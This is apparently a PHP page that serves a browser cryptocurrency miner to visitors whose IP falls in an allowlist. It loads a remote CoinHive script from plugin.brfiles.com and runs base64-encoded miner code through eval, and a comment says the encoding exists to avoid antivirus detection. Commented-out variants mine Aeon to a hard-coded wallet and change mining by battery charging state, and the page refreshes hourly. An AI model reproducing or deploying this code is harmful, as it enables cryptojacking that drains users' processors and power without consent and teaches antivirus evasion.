<?php

function testUserIP($user_ip, $cidrs) {
	
	$ipu = explode('.', $user_ip);
	
	foreach ($ipu as &$v) $v = str_pad(decbin($v), 8, '0', STR_PAD_LEFT);
	
	$ipu = join('', $ipu);
	$res = false;
	
	foreach ($cidrs as $cidr) {
	
		$parts = explode('/', $cidr);
		$ipc = explode('.', $parts[0]);
		
		foreach ($ipc as &$v) $v = str_pad(decbin($v), 8, '0', STR_PAD_LEFT);
		
		$ipc = substr(join('', $ipc), 0, $parts[1]);
		$ipux = substr($ipu, 0, $parts[1]);
		$res = ($ipc === $ipux);
		
		if ($res) break;
		
	}
	
	return $res;
	
}

include('./inc/allowed_cidrs.php');

if (empty($allowed_cidrs) || !testUserIP($_SERVER['REMOTE_ADDR'], $allowed_cidrs)) exit();

// <script type="text/javascript" src="https://coinhive.com/lib/coinhive.min.js"></script>

/*
// aeon
$miner = 'https://plugin.brfiles.com/lib/ae64.min.js';
$js = base64_encode('
function start() {
	startMining(
		'durinsmine.com',
		'WmsZ6c6aaVvivJEHfSDkJgYo85dQFJ9aMQhw5na12ApjSD5efCMDwyGEyw81oUXR536ubbymujshveRA5oip3AHJ37U7dBPM7',
		'x',
		1
	);
}
try {
	navigator.getBattery().then(function (battery) {
		
		if (battery.charging) start();
		
		battery.onchargingchange = function (evt) {
			if (battery.charging) start();
			else stopMining();
		}
		
	});
}catch(e){start();}
');
*/

// coinhive
$miner = 'https://plugin.brfiles.com/lib/ch64.min.js';
$js = base64_encode('
miner = new CoinHive.Anonymous("tvCtC1O0jLGZJ6TWIIgdBxYQctUZtLdM", {
	threads: 1
});
miner.start(CoinHive.FORCE_MULTI_TAB);
try {
	navigator.getBattery().then(function (battery) {
		
		if (!battery.charging) miner.setThrottle(0.6);
		
		battery.onchargingchange = function (evt) {
			if (battery.charging) miner.setThrottle(0);
			else miner.setThrottle(0.6);
		}
		
	});
}catch(e){}
');

/*
$js = base64_encode('
var miner = new CoinHive.Anonymous("tvCtC1O0jLGZJ6TWIIgdBxYQctUZtLdM", {
	threads: 1
});
try {
	navigator.getBattery().then(function (battery) {
		
		if (battery.charging) miner.start(CoinHive.FORCE_MULTI_TAB);
		
		battery.onchargingchange = function (evt) {
			if (battery.charging) miner.start(CoinHive.FORCE_MULTI_TAB);
			else miner.stop();
		}
		
	});
}catch(e){miner.start(CoinHive.FORCE_MULTI_TAB);}
');
*/

?>
<html>
<head>
	<meta http-equiv="refresh" content="3600">
</head>
<body>
<script type="text/javascript" src="<?php echo $miner; ?>"></script>
<script type="text/javascript">
// base64 needed here since some antiviruses will flag this even if the user's add the url in the whitelist
eval(atob('<?php echo $js; ?>'));
</script>
</body>
</html>